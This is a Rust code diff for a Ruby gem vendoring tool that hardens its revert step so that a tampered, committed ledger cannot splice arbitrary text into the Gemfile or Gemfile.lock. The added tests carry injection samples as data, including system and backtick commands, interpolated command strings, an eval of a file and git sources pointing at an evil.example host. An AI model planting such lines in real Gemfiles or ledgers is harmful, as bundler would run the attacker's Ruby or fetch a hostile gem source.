@@ -1150,13 +1150,21 @@ pub async fn revert_gem_opts(
     // none drifted: the Gemfile `path:` and the lock's PATH section must
     // move together, or bundler refuses the pair on every frozen install
     // (#988).
+    let Some((name, version)) = parse_gem_purl(&entry.base_purl) else {
+        return RevertOutcome::failed(format!("not a gem purl: {}", entry.base_purl));
+    };
+    let own = OwnGem {
+        entry,
+        name: name.into_owned(),
+        version: version.into_owned(),
+    };
     let mut files = RevertFiles::new(project_root);
     let mut drifted = false;
     for w in entry.wiring.iter().rev() {
         let restored = match w.kind.as_str() {
-            LOCK_WIRING_KIND => revert_lock_record(&mut files, w).await,
-            LOCK_CHECKSUM_WIRING_KIND => revert_lock_checksum_record(&mut files, w).await,
-            GEMFILE_WIRING_KIND => revert_gemfile_record(&mut files, w).await,
+            LOCK_WIRING_KIND => revert_lock_record(&mut files, w, &own).await,
+            LOCK_CHECKSUM_WIRING_KIND => revert_lock_checksum_record(&mut files, w, &own).await,
+            GEMFILE_WIRING_KIND => revert_gemfile_record(&mut files, w, &own).await,
             _ => {
                 warnings.push(VendorWarning::new(
                     "vendor_lock_entry_drifted",
@@ -1594,7 +1602,12 @@ fn is_keyword_arg(arg: &str) -> bool {
 /// preserved `source:`, `gitlab:` or custom `git_source` key (in any
 /// spelling — the shared [`gemfile::source_option`] reader, the one hosted
 /// mode refuses with) alongside the `path:` we add would fail every
-/// `bundle` invocation.
+/// `bundle` invocation. And so is a computed positional argument
+/// ([`gemfile::inert_positionals`]): the rewrite drops the positional
+/// arguments and `vendor --revert` puts the declaration back from the
+/// committed ledger, which it does only for arguments that evaluate
+/// nothing — so the same test decides what the revert restores
+/// ([`OwnGem::rewrite_refusal`]).
 fn rest_blocks_edit(rest: &str) -> Option<String> {
     if let Some(reason) = gem_line_tail_blocks_edit(rest) {
         return Some(reason);
@@ -1602,6 +1615,14 @@ fn rest_blocks_edit(rest: &str) -> Option<String> {
     let code = rest.split('#').next().unwrap_or("").trim();
     if code.is_empty() {
         return None;
+    }
+    if !gemfile::inert_positionals(rest) {
+        return Some(
+            "it computes a positional argument (a method call, a string interpolating one, or a \
+             hash naming a source), which `vendor --revert` could not put back safely; use a \
+             literal, a constant or an ENV lookup"
+                .to_string(),
+        );
     }
     // A `**opts` splat or hash literal is kept after `path:` (#847): a
     // source hidden in it makes bundler refuse the Gemfile loudly.
@@ -2237,6 +2258,168 @@ fn lock_checksum_in_sync(lock_text: &str, name: &str, version: &str) -> bool {
     true
 }
 
+// ── what a ledger record may write ───────────────────────────────────────────
+
+/// The gem a ledger entry vendors, for checking what one of its records
+/// replaces and what it puts back, right where the revert is about to
+/// splice recorded text in.
+///
+/// The ledger is committed, so a checkout can carry any ledger; the revert
+/// splices its text into the Gemfile (Ruby that every `bundle` command
+/// runs) and the lock (what bundler installs from). Each record must
+/// therefore be the pair edit [`vendor_gem`] makes for THIS gem, or the
+/// revert fails with nothing written (every file is planned in memory
+/// first). A record whose pre-vendor state is already back writes nothing
+/// and is not checked, so a hand-restored Gemfile still converges.
+struct OwnGem<'a> {
+    entry: &'a VendorEntry,
+    name: String,
+    version: String,
+}
+
+impl OwnGem<'_> {
+    /// Whether `value` (a `path:` or `remote:` value) is this patch's copy
+    /// of the gem.
+    fn is_copy(&self, value: &str) -> bool {
+        parse_vendor_path(value).is_some_and(|p| {
+            p.eco == "gem"
+                && p.uuid == self.entry.uuid
+                && p.leaf == format!("{}-{}", self.name, self.version)
+        })
+    }
+
+    /// The vendored declaration of the gem on a Gemfile line: a top-level
+    /// `gem "<name>", …, path: "<this patch's copy>"`.
+    fn vendored_declaration<'l>(&self, line: &'l str) -> Option<GemDecl<'l>> {
+        gem_declaration(line, &self.name).filter(|d| {
+            !d.paren && gem_line_path_value(d.rest).is_some_and(|path| self.is_copy(path))
+        })
+    }
+
+    /// The failure of the revert over `rec`, which `why`.
+    fn refused(&self, rec: &WiringRecord, why: &str) -> String {
+        super::state::refused_record(self.entry, rec, why)
+    }
+
+    /// Why replacing the Gemfile line `written` with `original` is not the
+    /// undo of the vendored rewrite: `written` must be this patch's own
+    /// `path:` declaration, and `original` ONE top-level declaration of the
+    /// same gem that the rewrite replaces — no source option, nothing
+    /// computed among the positional arguments it dropped
+    /// ([`rest_blocks_edit`]), and the keyword options the vendored line
+    /// still shows.
+    fn rewrite_refusal(&self, written: &str, original: &str) -> Option<&'static str> {
+        let Some(vendored) = self
+            .vendored_declaration(written)
+            .filter(|_| is_one_line(written, true))
+        else {
+            return Some(NOT_OUR_DECLARATION);
+        };
+        let restorable = is_one_line(original, true)
+            && gem_declaration(original, &self.name).is_some_and(|d| {
+                !d.paren
+                    && rest_blocks_edit(d.rest).is_none()
+                    && kept_keywords(d.rest) == keywords_after_path(vendored.rest)
+            });
+        (!restorable).then_some(
+            "puts back Gemfile text that is not one plain declaration of this gem the vendored \
+             line replaced",
+        )
+    }
+
+    /// Why removing the Gemfile text `written` is not the undo of the
+    /// managed block: the fence around this patch's own declaration.
+    fn block_refusal(&self, written: &str) -> Option<&'static str> {
+        let lines: Vec<&str> = written
+            .split('\n')
+            .map(|l| l.strip_suffix('\r').unwrap_or(l))
+            .collect();
+        let ours = match lines.as_slice() {
+            [MANAGED_OPEN, decl, MANAGED_CLOSE, ""] => {
+                is_one_line(decl, false) && self.vendored_declaration(decl).is_some()
+            }
+            _ => false,
+        };
+        (!ours).then_some(NOT_OUR_DECLARATION)
+    }
+
+    /// Why swapping the lock lines `new` for `original` is not the undo of
+    /// the lock edit: `new` is this patch's `PATH` section and dependency
+    /// entry, `original` the gem's own spec block (one entry per platform,
+    /// each with its dependency lines), the `remote:` of the section it
+    /// came from and its dependency entry — one lock line each.
+    fn lock_refusal(&self, original: &[String], new: &[String]) -> Option<&'static str> {
+        let plain = |lines: &[String]| lines.iter().all(|l| is_one_line(l, false));
+        let our_section = new.split_last().is_some_and(|(dep, path)| {
+            path.first().is_some_and(|l| l == "PATH")
+                && path
+                    .get(1)
+                    .and_then(|l| l.strip_prefix("  remote: "))
+                    .is_some_and(|remote| self.is_copy(remote))
+                && dep_entry_name(dep) == Some(self.name.as_str())
+        });
+        if !plain(new) || !our_section {
+            return Some(
+                "replaces lock lines that are not this patch's own PATH section and dependency \
+                 entry",
+            );
+        }
+        let own = |line: &String| {
+            if let Some(entry) = at_indent(line, 4) {
+                crate::formats::gem::parse_spec(entry).is_some_and(|spec| spec.name == self.name)
+            } else if let Some(dependency) = line.strip_prefix("      ") {
+                dependency
+                    .split([' ', '('])
+                    .next()
+                    .is_some_and(is_plain_gem_token)
+            } else {
+                line.starts_with("  remote: ") || dep_entry_name(line) == Some(self.name.as_str())
+            }
+        };
+        (!plain(original) || !original.iter().all(own)).then_some(
+            "puts back lock lines that are not this gem's own spec block, source remote and \
+             dependency entry",
+        )
+    }
+
+    /// Whether `line` is the gem's own `CHECKSUMS` entry.
+    fn is_checksum(&self, line: &str) -> bool {
+        is_one_line(line, false) && checksum_entry(line).is_some_and(|(gem, _)| gem == self.name)
+    }
+}
+
+const NOT_OUR_DECLARATION: &str =
+    "replaces Gemfile text that is not this patch's own `path:` declaration";
+const NOT_OUR_CHECKSUM: &str = "swaps CHECKSUMS lines that are not this gem's own entry";
+
+/// A recorded line: no line break or other control character (a tab
+/// aside), so it stays the one line it is spliced in as. `cr` allows the
+/// CR of a CRLF Gemfile line, which is recorded with it.
+fn is_one_line(line: &str, cr: bool) -> bool {
+    let body = if cr {
+        line.strip_suffix('\r').unwrap_or(line)
+    } else {
+        line
+    };
+    !body.chars().any(|c| c.is_control() && c != '\t')
+}
+
+/// The keyword options of a declaration's tail, as the vendored rewrite
+/// keeps them ([`split_kept_tail`]).
+fn kept_keywords(rest: &str) -> String {
+    let opts = gemfile::trailing_options(rest.strip_suffix('\r').unwrap_or(rest));
+    split_kept_tail(&opts).keywords.to_string()
+}
+
+/// The keyword options a vendored declaration carries after its own
+/// `path:`: the ones the rewrite kept from the line it replaced.
+fn keywords_after_path(rest: &str) -> String {
+    let kept = kept_keywords(rest);
+    gemfile::split_args(&kept)
+        .and_then(|args| args.get(1).map(|(at, _)| kept[*at..].trim().to_string()))
+        .unwrap_or_default()
+}
+
 // ── revert helpers ───────────────────────────────────────────────────────────
 
 /// What restoring one wiring record found on disk.
@@ -2368,6 +2551,7 @@ impl RevertFile {
 async fn revert_gemfile_record(
     files: &mut RevertFiles<'_>,
     w: &WiringRecord,
+    own: &OwnGem<'_>,
 ) -> Result<RecordRevert, String> {
     let Some(file) = files.text(GEMFILE).await? else {
         return Ok(RecordRevert::FileMissing);
@@ -2396,6 +2580,9 @@ async fn revert_gemfile_record(
                 }
                 return Ok(gemfile_left_without_our_line(text, written));
             };
+            if let Some(why) = own.rewrite_refusal(written, original) {
+                return Err(own.refused(w, why));
+            }
             let line = restore_gemfile_line(lines[i], written, original);
             lines[i] = &line;
             lines.join("\n")
@@ -2416,6 +2603,9 @@ async fn revert_gemfile_record(
                 // unless an edited copy of it still wires the gem in.
                 return Ok(gemfile_left_without_our_line(text, &written));
             };
+            if let Some(why) = own.block_refusal(&written) {
+                return Err(own.refused(w, why));
+            }
             let mut out = String::with_capacity(text.len());
             out.push_str(&text[..at]);
             out.push_str(&text[at + written.len()..]);
@@ -2513,6 +2703,7 @@ fn split_line_comment(line: &str) -> (&str, &str) {
 async fn revert_lock_record(
     files: &mut RevertFiles<'_>,
     w: &WiringRecord,
+    own: &OwnGem<'_>,
 ) -> Result<RecordRevert, String> {
     let Some(original_lines) = wiring_string_array(w.original.as_ref()) else {
         return Ok(RecordRevert::Drifted);
@@ -2536,6 +2727,9 @@ async fn revert_lock_record(
             },
         );
     };
+    if let Some(why) = own.lock_refusal(&original_lines, &new_lines) {
+        return Err(own.refused(w, why));
+    }
     file.set(restored);
     Ok(RecordRevert::Done)
 }
@@ -2586,6 +2780,7 @@ fn wiring_string_array(v: Option<&Value>) -> Option<Vec<String>> {
 async fn revert_lock_checksum_record(
     files: &mut RevertFiles<'_>,
     w: &WiringRecord,
+    own: &OwnGem<'_>,
 ) -> Result<RecordRevert, String> {
     let Some(written) = w.new.as_ref().and_then(Value::as_str) else {
         return Ok(RecordRevert::Drifted);
@@ -2619,6 +2814,9 @@ async fn revert_lock_checksum_record(
         // pre-vendor state, not drift.
         return Ok(RecordRevert::Done);
     };
+    if !own.is_checksum(written) || !own.is_checksum(original) {
+        return Err(own.refused(w, NOT_OUR_CHECKSUM));
+    }
     lines[i] = original.to_string();
     file.set(lines.join("\n"));
     Ok(RecordRevert::Done)
@@ -7739,6 +7937,194 @@ mod tests {
         assert!(!root.join(format!(".socket/vendor/gem/{UUID}")).exists());
     }
 
+    /// The ledger is committed, so a record can say anything. A record
+    /// whose text is not the pair edit of THIS gem — Ruby put back into the
+    /// Gemfile, a line of the Gemfile that vendoring did not write, lock
+    /// lines beyond the gem's own — fails the revert, and neither file is
+    /// written.
+    #[tokio::test]
+    async fn revert_refuses_records_that_are_not_this_gems_pair_edit() {
+        fn gemfile_original(e: &mut VendorEntry, line: &str) {
+            e.wiring[0].original = Some(Value::String(line.to_string()));
+        }
+        type Tamper = Box<dyn Fn(&mut VendorEntry)>;
+        let ruby = |line: &'static str| -> Tamper { Box::new(move |e| gemfile_original(e, line)) };
+        let cases: Vec<(&str, Tamper)> = vec![
+            (
+                "a method call",
+                ruby("gem \"rack\", system(\"touch PWNED\").to_s"),
+            ),
+            ("a backtick", ruby("gem \"rack\", `touch PWNED`")),
+            (
+                "an interpolation",
+                ruby("gem \"rack\", \"#{`touch PWNED`}\""),
+            ),
+            (
+                "a second statement",
+                ruby("gem \"rack\"; system(\"touch PWNED\")"),
+            ),
+            (
+                "a second line",
+                ruby("gem \"rack\"\nsystem(\"touch PWNED\")"),
+            ),
+            (
+                "another source",
+                ruby("gem \"rack\", git: \"https://evil.example/rack.git\""),
+            ),
+            (
+                "a source in a hash",
+                ruby("gem \"rack\", { git: \"https://evil.example/rack.git\" }"),
+            ),
+            (
+                "an option the vendored line does not carry",
+                ruby("gem \"rack\", \"~> 3.1\", require: \"evil\""),
+            ),
+            ("another gem", ruby("gem \"evil\"")),
+            ("an indented declaration", ruby("  gem \"rack\"")),
+            ("no declaration", ruby("eval(File.read(\"x\"))")),
+            (
+                "a Gemfile line vendoring did not write",
+                Box::new(|e| {
+                    e.wiring[0].new = Some(Value::String("gem \"puma\"".to_string()));
+                    gemfile_original(e, "gem \"puma\"; system(\"touch PWNED\")");
+                }),
+            ),
+            (
+                "a lock section beyond the spec block",
+                Box::new(|e| {
+                    let lines = e.wiring[1]
+                        .original
+                        .as_mut()
+                        .unwrap()
+                        .as_array_mut()
+                        .unwrap();
+                    lines[0] = Value::String(
+                        "    rack (3.2.6)\n\nGIT\n  remote: https://evil.example/rack.git".into(),
+                    );
+                }),
+            ),
+            (
+                "another gem's spec line",
+                Box::new(|e| {
+                    let lines = e.wiring[1]
+                        .original
+                        .as_mut()
+                        .unwrap()
+                        .as_array_mut()
+                        .unwrap();
+                    lines.insert(1, Value::String("    evil (6.6.6)".into()));
+                }),
+            ),
+            (
+                "another gem's dependency entry",
+                Box::new(|e| {
+                    let lines = e.wiring[1]
+                        .original
+                        .as_mut()
+                        .unwrap()
+                        .as_array_mut()
+                        .unwrap();
+                    lines.push(Value::String("  evil".into()));
+                }),
+            ),
+        ];
+        for (label, tamper) in cases {
+            let (_tmp, root, installed, blobs, record) = fixture(GEMFILE_DIRECT, LOCK_DIRECT).await;
+            let (result, entry, _) =
+                unwrap_done(run_vendor(&root, &blobs, &installed, &record, false).await);
+            assert!(result.success, "{label}: {:?}", result.error);
+            let mut entry = entry.unwrap();
+            tamper(&mut entry);
+            let wired = (
+                tokio::fs::read_to_string(root.join(GEMFILE)).await.unwrap(),
+                tokio::fs::read_to_string(root.join(GEMFILE_LOCK))
+                    .await
+                    .unwrap(),
+            );
+
+            for dry_run in [true, false] {
+                let outcome = revert_gem(&entry, &root, dry_run).await;
+                assert!(!outcome.success, "{label}");
+                let error = outcome.error.unwrap_or_default();
+                assert!(error.contains("ledger record"), "{label}: {error}");
+                assert!(!outcome.kept_artifact, "{label}");
+            }
+            let after = (
+                tokio::fs::read_to_string(root.join(GEMFILE)).await.unwrap(),
+                tokio::fs::read_to_string(root.join(GEMFILE_LOCK))
+                    .await
+                    .unwrap(),
+            );
+            assert_eq!(after, wired, "{label}: neither file is written");
+            assert!(root.join(copy_rel()).exists(), "{label}: the copy stays");
+        }
+    }
+
+    /// A record the revert would refuse to write is not in the way once the
+    /// pre-vendor declaration is back by hand: nothing is left to write
+    /// for it, so the lock still follows.
+    #[tokio::test]
+    async fn revert_converges_once_a_refused_declaration_is_restored_by_hand() {
+        // What a ledger written before the rewrite refused computed
+        // arguments can hold.
+        let computed = "gem \"rack\", rack_version_for(:prod)";
+        let (_tmp, root, installed, blobs, record) = fixture(GEMFILE_DIRECT, LOCK_DIRECT).await;
+        let (_, entry, _) =
+            unwrap_done(run_vendor(&root, &blobs, &installed, &record, false).await);
+        let mut entry = entry.unwrap();
+        entry.wiring[0].original = Some(Value::String(computed.to_string()));
+        assert!(!revert_gem(&entry, &root, false).await.success);
+
+        let by_hand = GEMFILE_DIRECT.replace("gem \"rack\", \"~> 3.1\"", computed);
+        tokio::fs::write(root.join(GEMFILE), &by_hand)
+            .await
+            .unwrap();
+        let outcome = revert_gem(&entry, &root, false).await;
+        assert!(outcome.success, "{:?}", outcome.error);
+        assert_eq!(
+            tokio::fs::read_to_string(root.join(GEMFILE)).await.unwrap(),
+            by_hand
+        );
+        assert_eq!(
+            tokio::fs::read_to_string(root.join(GEMFILE_LOCK))
+                .await
+                .unwrap(),
+            LOCK_DIRECT
+        );
+        assert!(!root.join(copy_rel()).exists());
+    }
+
+    /// The rewrite drops the positional arguments and the revert puts them
+    /// back from the ledger, so a declaration whose positional argument is
+    /// computed is refused up front: nothing is vendored that could not be
+    /// reverted.
+    #[tokio::test]
+    async fn computed_positional_arguments_are_refused_before_anything_is_written() {
+        for declaration in [
+            "gem \"rack\", rack_version_for(:prod)",
+            "gem \"rack\", File.read(\"RACK_VERSION\").strip",
+            "gem \"rack\", \"~> #{version_for(:rack)}\"",
+        ] {
+            let gemfile = GEMFILE_DIRECT.replace("gem \"rack\", \"~> 3.1\"", declaration);
+            let (_tmp, root, installed, blobs, record) = fixture(&gemfile, LOCK_DIRECT).await;
+            let (code, detail) =
+                unwrap_refused(run_vendor(&root, &blobs, &installed, &record, false).await);
+            assert_eq!(
+                code, "gemfile_declaration_not_editable",
+                "{declaration}: {detail}"
+            );
+            assert!(
+                detail.contains("computes a positional argument"),
+                "{declaration}: {detail}"
+            );
+            assert_eq!(
+                tokio::fs::read_to_string(root.join(GEMFILE)).await.unwrap(),
+                gemfile
+            );
+            assert!(!root.join(".socket/vendor").exists(), "{declaration}");
+        }
+    }
+
     /// Malformed / hand-stripped ledger records must degrade to a drift
     /// warning — never a partial splice. Each tamper is probed with a
     /// DRY-RUN revert (no writes), so one vendored fixture serves the whole
@@ -8514,6 +8900,26 @@ mod tests {
         assert_eq!(spec_entry_name("      base64 (>= 0.1.0)"), None);
     }
 
+    /// A ledger entry for the fixture gem, and what its records are checked
+    /// against.
+    fn rack_entry() -> VendorEntry {
+        VendorEntry::new(
+            "gem".to_string(),
+            PURL.to_string(),
+            UUID.to_string(),
+            VendorArtifact::dir(copy_rel(), Default::default()),
+            Vec::new(),
+        )
+    }
+
+    fn own_rack(entry: &VendorEntry) -> OwnGem<'_> {
+        OwnGem {
+            entry,
+            name: "rack".to_string(),
+            version: "3.2.6".to_string(),
+        }
+    }
+
     /// An unreadable (present but non-regular) Gemfile fails a `gemfile_line`
     /// revert loudly — unlike a MISSING one, which is reported as
     /// `vendor_lockfile_missing` (`FileMissing`, not drift) and does not
@@ -8536,7 +8942,8 @@ mod tests {
                 copy_rel()
             ))),
         };
-        let err = revert_gemfile_record(&mut RevertFiles::new(dir.path()), &w)
+        let entry = rack_entry();
+        let err = revert_gemfile_record(&mut RevertFiles::new(dir.path()), &w, &own_rack(&entry))
             .await
             .expect_err("a directory squatting the Gemfile path must error");
         assert!(err.contains("unreadable Gemfile"), "{err}");
@@ -8557,7 +8964,8 @@ mod tests {
             original: Some(serde_json::json!(["    rack (3.2.6)"])),
             new: Some(Value::String("not-an-array".to_string())),
         };
-        let restored = revert_lock_record(&mut RevertFiles::new(dir.path()), &w)
+        let entry = rack_entry();
+        let restored = revert_lock_record(&mut RevertFiles::new(dir.path()), &w, &own_rack(&entry))
             .await
             .unwrap();
         assert_eq!(
